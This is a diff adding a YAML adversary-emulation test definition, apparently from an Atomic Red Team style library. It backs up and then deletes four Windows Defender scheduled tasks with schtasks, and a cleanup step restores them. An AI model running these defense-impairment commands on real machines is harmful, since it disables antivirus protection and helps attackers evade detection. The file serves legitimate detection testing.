@@ -1,0 +1,27 @@
+- id: 4b8cf47c-cd87-53e7-b45c-02374197fe3e
+  name: Soumaia ART Tests - Delete Windows Defender Scheduled Tasks
+  description: 'The following atomic test will delete the Windows Defender scheduled tasks.
+
+
+    [Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/) (requires elevation)'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          cmd /c "IF EXIST ""%temp%\Windows_Defender_Scheduled_Scan.xml"" ( EXIT 0 ) ELSE ( EXIT 1 )"
+          if not "%ERRORLEVEL%"=="0" (
+              cmd /c "schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" > ""%temp%\Windows_Defender_Scheduled_Scan.xml"" & schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" > ""%temp%\Windows_Defender_Cleanup.xml"" & schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Verification"" > ""%temp%\Windows_Defender_Verification.xml"" & schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" > ""%temp%\Windows_Defender_Cache_Maintenance.xml"""
+          )
+          IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f )
+          IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f )
+          IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f )
+          IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )
+        cleanup: |-
+          schtasks /create /xml "%temp%\Windows_Defender_Scheduled_Scan.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
+          schtasks /create /xml "%temp%\Windows_Defender_Cleanup.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
+          schtasks /create /xml "%temp%\Windows_Defender_Verification.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f
+          schtasks /create /xml "%temp%\Windows_Defender_Cache_Maintenance.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
